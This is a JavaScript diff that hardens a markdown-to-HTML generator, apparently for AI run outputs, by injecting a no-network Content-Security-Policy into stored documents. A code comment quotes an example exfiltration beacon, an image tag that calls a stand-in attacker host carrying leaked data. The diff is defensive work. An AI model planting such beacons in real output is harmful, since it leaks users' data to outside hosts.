@@ -60,8 +60,26 @@ function csvField(value) {
  * has an <html> element) is stored as written — that is a deliberate choice by
  * the run, and the panel still renders it inside a sandboxed frame.
  */
+/**
+ * The stored document's own content security policy.
+ *
+ * A document's content can originate from page content a model quoted, so an
+ * `<img src="https://attacker.example/?leak=…">` inside one would beacon the
+ * moment anyone opened it. The panel previews these in a sandboxed frame, but
+ * `sandbox` stops scripts, not the network — and a downloaded `.html` is opened
+ * outside the panel entirely. `default-src 'none'` means no request of any kind
+ * leaves the document; inline styles are allowed because this generator's own
+ * stylesheet is inline, and images only as `data:`, which is bytes already in
+ * the file rather than a fetch.
+ */
+const HTML_DOCUMENT_CSP =
+  `<meta http-equiv="Content-Security-Policy" content="default-src 'none'; style-src 'unsafe-inline'; img-src data:">`;
+
 export function markdownToHtml(source, meta = {}) {
-  if (/<html[\s>]/i.test(source)) return source.endsWith("\n") ? source : `${source}\n`;
+  // A run that deliberately wrote a whole document keeps its own markup, but it
+  // does not get to keep network access: the policy is injected into its head
+  // (or a head is created for it) so a beacon cannot ride along.
+  if (/<html[\s>]/i.test(source)) return withDocumentCsp(source);
 
   const body = [];
   for (const block of parseMarkdownBlocks(source)) {
@@ -111,6 +129,10 @@ export function markdownToHtml(source, meta = {}) {
     "<head>",
     '<meta charset="utf-8">',
     '<meta name="viewport" content="width=device-width, initial-scale=1">',
+    // The stored file carries its own policy, so it is inert wherever it is
+    // opened later — the panel's sandboxed frame is not the only place an
+    // operator might open a downloaded .html.
+    HTML_DOCUMENT_CSP,
     `<title>${title}</title>`,
     "<style>",
     "body{font:16px/1.6 system-ui,-apple-system,Segoe UI,Roboto,sans-serif;max-width:44rem;margin:2.5rem auto;padding:0 1.25rem;color:#1a1a1c}",
@@ -126,6 +148,20 @@ export function markdownToHtml(source, meta = {}) {
     "</html>",
     ""
   ].join("\n");
+}
+
+/**
+ * Put the policy meta first inside the document's head.
+ *
+ * Placed FIRST because a meta CSP only governs what follows it — a policy
+ * written after an <img> would not stop that image from loading.
+ */
+function withDocumentCsp(source) {
+  const text = source.endsWith("\n") ? source : `${source}\n`;
+  if (/content-security-policy/i.test(text)) return text;
+  if (/<head[^>]*>/i.test(text)) return text.replace(/<head[^>]*>/i, (head) => `${head}${HTML_DOCUMENT_CSP}`);
+  if (/<html[^>]*>/i.test(text)) return text.replace(/<html[^>]*>/i, (html) => `${html}<head>${HTML_DOCUMENT_CSP}</head>`);
+  return `${HTML_DOCUMENT_CSP}${text}`;
 }
 
 /** Inline markdown -> HTML, every run's text escaped before any tag is added. */
